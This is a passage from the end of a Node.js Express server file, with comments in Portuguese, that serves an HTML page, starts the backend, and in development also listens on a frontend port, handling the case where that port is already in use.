  res.sendFile(path.join(frontendPath, 'page.html'), (err) => {
    if (err) {
      console.error('Erro ao servir page.html:', err);
      res.status(404).json({ error: true, message: 'Page not found' });
    }
  });
});

const port = Number(process.env.PORT || 3001);
const frontendPort = Number(process.env.FRONTEND_PORT || 3000);

app.listen(port, () => {
  // eslint-disable-next-line no-console
  console.log(`Backend running on http://localhost:${port}`);
});

// Em desenvolvimento, também escuta na porta 3000 para servir o frontend com roteamento
// Isso permite que /produto funcione localmente sem precisar do http-server separado
if (process.env.NODE_ENV !== 'production' && port !== frontendPort && process.env.ENABLE_FRONTEND_PORT !== 'false') {
  // Tenta escutar na porta 3000, mas não falha se já estiver em uso
  const frontendServer = app.listen(frontendPort, () => {
    // eslint-disable-next-line no-console
    console.log(`Frontend (via backend) running on http://localhost:${frontendPort}`);
    console.log(`✅ Acesse: http://localhost:${frontendPort}/produto?payment=29.99`);
  });
  
  frontendServer.on('error', (err) => {
    if (err.code === 'EADDRINUSE') {
      console.log(`⚠️  Porta ${frontendPort} já está em uso. Pare o http-server na porta 3000 ou use: http://localhost:${port}/produto?payment=29.99`);
    } else {
      console.error('Erro ao iniciar servidor frontend:', err);
    }
  });
}


